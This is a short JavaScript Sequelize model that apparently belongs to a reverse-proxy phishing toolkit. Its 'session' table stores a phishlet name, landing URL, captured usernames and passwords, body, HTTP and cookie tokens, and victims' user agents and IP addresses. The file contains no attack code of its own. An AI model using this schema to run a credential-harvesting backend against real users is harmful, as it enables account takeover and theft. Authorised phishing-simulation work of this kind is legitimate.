module.exports = (sequelize, Sequelize) => {
  const Session = sequelize.define("session", {
    phishlet: {
      type: Sequelize.STRING,
      allowNull: true,
    },
    landingUrl: {
      type: Sequelize.STRING,
      allowNull: true,
    },
    username: {
      type: Sequelize.STRING,
      allowNull: true,
    },
    password: {
      type: Sequelize.STRING,
      allowNull: true,
    },
    bodyToken: {
      type: Sequelize.STRING(1000),
      allowNull: true,
    },
    httpToken: {
      type: Sequelize.STRING(1000),
      allowNull: true,
    },
    cookieToken: {
      type: Sequelize.STRING(10000),
      allowNull: true,
    },
    sessionId: {
      type: Sequelize.STRING,
      allowNull: true,
    },
    userAgent: {
      type: Sequelize.STRING,
      allowNull: true,
    },
    remoteAddr: {
      type: Sequelize.STRING,
      allowNull: true,
    },
  });

  return Session;
};
